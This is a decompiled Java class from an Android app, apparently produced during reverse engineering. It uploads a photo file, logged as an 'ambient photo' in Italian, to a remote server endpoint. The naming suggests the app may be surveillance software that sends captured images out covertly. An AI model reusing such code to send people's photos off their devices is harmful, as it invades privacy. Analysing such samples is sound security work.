package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.h;
import java.io.File;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class m
  extends a
{
  public m(String paramString)
  {
    super(null, paramString);
  }
  
  public int a(Context paramContext, String paramString, File paramFile)
  {
    try
    {
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append(this.a);
      localStringBuilder.append('_');
      localStringBuilder.append(paramString);
      paramString = localStringBuilder.toString();
      localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("INVIO FOTO AMB. ");
      localStringBuilder.append(paramString);
      h.a(paramContext, localStringBuilder.toString());
      paramContext = new java/lang/StringBuilder;
      paramContext.<init>();
      paramContext.append(this.c);
      paramContext.append("/UploadPic");
      paramContext.append("/");
      paramContext.append(paramString);
      paramContext = com.app.system.common.d.a.a.a.b(paramContext.toString(), paramFile);
      if ((paramContext != null) && (!paramContext.equals("")))
      {
        paramContext = paramContext.body().string();
        paramString = new java/lang/StringBuilder;
        paramString.<init>();
        paramString.append("SendDataToServer result: ");
        paramString.append(paramContext);
        com.security.d.a.d("ProtocolPics", paramString.toString(), new Object[0]);
        boolean bool = paramContext.startsWith("0");
        if (bool) {
          return 0;
        }
        return -1;
      }
      return -1;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("ProtocolPics", paramContext.getMessage(), new Object[0]);
    }
    return -1;
  }
}


/* Location:              ~/com/app/system/common/d/a/m.class
 *
 * Reversed by:           J
 */